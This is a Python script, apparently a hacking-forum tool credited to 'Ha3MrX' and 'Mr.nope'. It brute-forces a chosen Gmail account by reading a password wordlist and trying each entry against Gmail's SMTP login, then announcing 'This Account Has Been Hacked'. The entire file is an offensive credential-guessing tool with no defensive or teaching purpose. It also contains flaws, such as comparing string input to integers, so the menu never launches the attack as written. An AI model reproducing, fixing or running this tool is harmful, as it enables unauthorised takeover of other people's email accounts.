#!/usr/bin/python3
'''create by Ha3MrX'''

import sys
import smtplib
import os
import time
import platform
system = platform.uname()[0]
Run_Err = """
Please, Run This Programm on Linux or MacOS!\n"""
def main():
   print('=================================================')
   print('|              create by Ha3MrX                 |')
   print('|              Update by Mr.nope                 |') 
   print('=================================================')
   print('               ++++++++++++++++++++              ')
   print('\n                                               ')
   print('  _,.                                            ')
   print('                                                 ')
   print('                                                 ')
   print('           Mr.nope                               ')
   print('       _,.                   ')
   print('     ,` -.)                  ')
   print('    ( _/-\\-._               ')
   print('   /,|`--._,-^|            , ')
   print('   \_| |`-._/||          , | ')
   print('     |  `-, / |         /  / ')
   print('     |     || |        /  /  ')
   print('      `r-._||/   __   /  /   ')
   print('  __,-<_     )`-/  `./  /    ')
   print('  \   `---    \   / /  /     ')
   print('     |           |./  /      ')
   print('     /           //  /       ')
   print(' \_/  \         |/  /        ')
   print('  |    |   _,^- /  /         ')
   print('  |    , ``  (\/  /_         ')
   print('   \,.->._    \X-=/^         ')
   print('   (  /   `-._//^`           ')
   print('    `Y-.____(__}             ')
   print('     |     {__)              ')
   print('           ()   V2.0         ')
   print('[1] start the attack')
   print('[2] exit')
   option = input('\n==>')
   if option == 1:
    login()
   elif option == 2:
     os.system("clear")
     print("\nExiting...")
     sys.exit()
   else:
      main()
def login():
    file_path = input("\nEnter File: ")
    time.sleep(1)
    pass_file = open(file_path,'r')
    pass_list = pass_file.readlines()
    i = 0
    user_name = input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print(str(i) + '/' + str(len(pass_list)))
      try:
         server.login(user_name, password)
         os.system('clear')
         main()
         print('\n')
         print('[+] This Account Has Been Hacked Password :' + password + '     ^_^')
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            os.system('clear')
            main()
            print('[+] this account has been hacked, password :' + password + '     ^_^')

            break
         else:
            print('[!] password not found => ' + password)
if __name__ == '__main__':
   if system == 'Linux':
      os.system('clear')
      main()
   elif system == 'Windows':
      print(Run_Err)
      sys.exit()
   else:
      print(Run_Err)
      sys.exit()